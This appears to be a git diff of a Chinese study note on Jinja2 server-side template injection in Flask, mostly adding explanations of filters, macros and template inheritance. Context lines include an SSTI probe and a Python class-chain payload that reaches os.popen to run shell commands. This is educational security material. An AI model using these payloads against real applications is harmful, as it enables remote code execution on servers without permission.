@@ -29,19 +29,89 @@ Python-Flask使用Jinja2作为渲染引擎 （Jinja2.10.x Documention）
 在jinja2中，存在三种语法：
 
 ```
-{% ... %} 用来声明变量
-{{ ... }} 用来将表达式打印到模板输出
+控制结构 {% %}，也可以用来声明变量（{% set c = "1" %}）
+变量取值 {{ }}，比如输入 1+1，2*2，或者是字符串、调用对象的方法，都会渲染出执行的结果
 {# ... #} 表示未包含在模板输出中的注释
 在模板注入中，主要使用的是{{}} 和 {%%}
 检测是否存在ssti
 在url后面，或是参数中添加 {{ 6*6 }} ，查看返回的页面中是否有 36
 ```
 
-jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这 些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等 
+jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等，被两个括号包裹的内容会输出其表达式的值。
 
-jinja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。
+###### 过滤器
 
-被两个括号包裹的内容会输出其表达式的值
+jinja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数，用于修饰变量，甚至支持参数 `range(10)|join(', ')`；以及链式调用，只需要在变量后面使用管道符 `|` 分割，前一个过滤器的输出会作为后一个过滤器的输入，例如，`{{ name|striptags|title }}` 会移除 HTML Tags，并且进行 title-case 转化，这个过滤器翻译为 Python 的语法就是 `title(striptags(name))`。
+
+###### 宏
+
+jinja2中还有宏，宏允许你定义一组代码，并在模板中多次调用它，类似于函数。
+
+使用 `macro` 关键字，并指定宏的名称和参数列表。然后，在模板中使用 `call` 关键字来调用宏，并传递相应的参数。
+
+```jinja2
+{% macro greet(name) %}
+    Hello, {{ name }}!
+{% endmacro %}
+
+{% call greet("A") %}
+{% call greet("B") %}
+```
+
+还能够设置默认参数
+
+```jinja2
+{% macro greet(name, greeting="Hello") %}
+    {{ greeting }}, {{ name }}!
+{% endmacro %}
+
+{% call greet("A") %}
+{% call greet("B", greeting="Hi") %}
+```
+
+###### 模板继承
+
+模板继承允许我们创建一个骨架文件，其他文件从该骨架文件继承。并且还支持针对自己需要的地方进行修改。
+
+jinja2 的骨架文件中，利用 `block` 关键字表示其包涵的内容可以进行修改。
+
+base.html
+
+```html
+<head>
+    {% block head %}
+    <title>{% block title %}{% endblock %} - Home</title>
+    {% endblock %}
+</head>
+
+<body>
+    <div id="content">{% block content %}{% endblock %}</div>
+    <div id="footer">
+        {% block  footer %}
+        <script>This is javascript</script>
+        {% endblock %}
+    </div>
+</body>
+```
+
+sub.html继承base.html的模板：
+
+```html
+{% extends "base.html" %}  <!-- 继承 -->
+
+{% block title %} Hello {% endblock %}  <!-- title 自定义 -->
+
+{% block head %}
+    {{ super() }}  <!-- 用于获取原有的信息 -->
+    <style type='text/css'>
+    .important { color: #FFFFFF }
+    </style>
+{% endblock %}   
+ 
+<!-- 其他不修改的原封不动的继承 -->
+```
+
+
 
 ##### Python中的一些 Magic Method
 
@@ -135,7 +205,7 @@ if __name__ == "__main__":
 
 ```
 
-![](../daydayup.assets/image-20230729181809015.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729181809015.png)
 
 
 
@@ -167,18 +237,18 @@ os模块执行命令:
 在已经加载os模块的子类里直接调用os模块：''.__class__.__bases__[0].__subclasses__()[341].__init__.__globals__['os'].popen("ls -l").read()
 ```
 
-`subprocess.Popen()`![](../daydayup.assets/image-20230729180632010.png)
+`subprocess.Popen()`![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729180632010.png)
 
 `os.system()`
-![](../daydayup.assets/image-20230729182735682.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729182735682.png)
 
 `linecache()`执行命令
-![](../daydayup.assets/image-20230729191643448.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729191643448.png)
 
-![](../daydayup.assets/image-20230729192011745.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729192011745.png)
 
 解析`{{().__class__.__bases__[0].__subclasses__()[%i].__init__.__globals__['__builtins__']}}`
-![](../daydayup.assets/image-20230729184733593.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729184733593.png)
 
 >`__class__.__base__.__subclasses__()` 列表中通常不会包含 `file` 类的子类，因为在 Python 3 中，`file` 类已经被移除，不再是内置类型。
 >
